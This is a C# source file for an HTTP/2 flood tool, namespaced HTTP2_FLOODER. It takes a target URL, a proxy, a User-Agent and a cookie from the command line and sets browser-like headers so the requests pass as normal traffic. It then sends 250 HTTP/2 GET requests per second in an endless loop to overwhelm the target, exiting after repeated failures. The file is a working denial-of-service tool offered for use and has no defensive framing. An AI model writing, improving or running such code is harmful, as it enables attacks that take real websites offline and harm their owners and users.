// See https://aka.ms/new-console-template for more information

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net;

namespace HTTP2_FLOODER {

    class program {
        static int ConcurentSecunds = 2;
        static int maxTrys = 4;

        static void Main(string[] args) {        
        AppContext.SetSwitch("System.Net.Http.UseSocketsHttpHandler", false);
        ServicePointManager.DefaultConnectionLimit = 20000;

     HttpClientHandler handler = new HttpClientHandler(){
            Proxy = new WebProxy(args[1]),
            UseProxy = true,
        };


        var client = new HttpClient(handler); 
        
        client.DefaultRequestHeaders.Add("User-Agent", args[2]);
        client.DefaultRequestHeaders.Add("Cookie", args[3]);
        client.DefaultRequestHeaders.Add("TE", "trailers, deflate");
        client.DefaultRequestHeaders.Add("Accept-Charset","utf-8");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");

        var tasks = new List<Task>();

        var task = Task.Run(async () => {
            for(;;) {
                await Task.Delay(1000);

                for (int i = 1; i <= 250; i++){
                    Client(client, args[0]);
                }
            }
        });

        Task.Run(async () => {
        for(;;) {
            await Task.Delay(5000);

        if (ConcurentSecunds-1 <= maxTrys){
            ConcurentSecunds= 2;
            maxTrys= 4;
        } else {
            handler.Dispose();
            client.Dispose();
            System.Environment.Exit(0);  
            Environment.Exit(0);
        }
}
});
    
    Console.ReadLine();
}

static async Task<object> Client(HttpClient client, string TARGETURL){
using var request = new HttpRequestMessage(HttpMethod.Get, TARGETURL){Version = new Version(2, 0) };

object resp = null;

try {
      var response = 
    await  client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead);
    resp = response;
    response.EnsureSuccessStatusCode();
    response.Dispose();
    return resp;
} catch (Exception e){

    Console.WriteLine(e);
    maxTrys--;
    return e;
}
}
}
}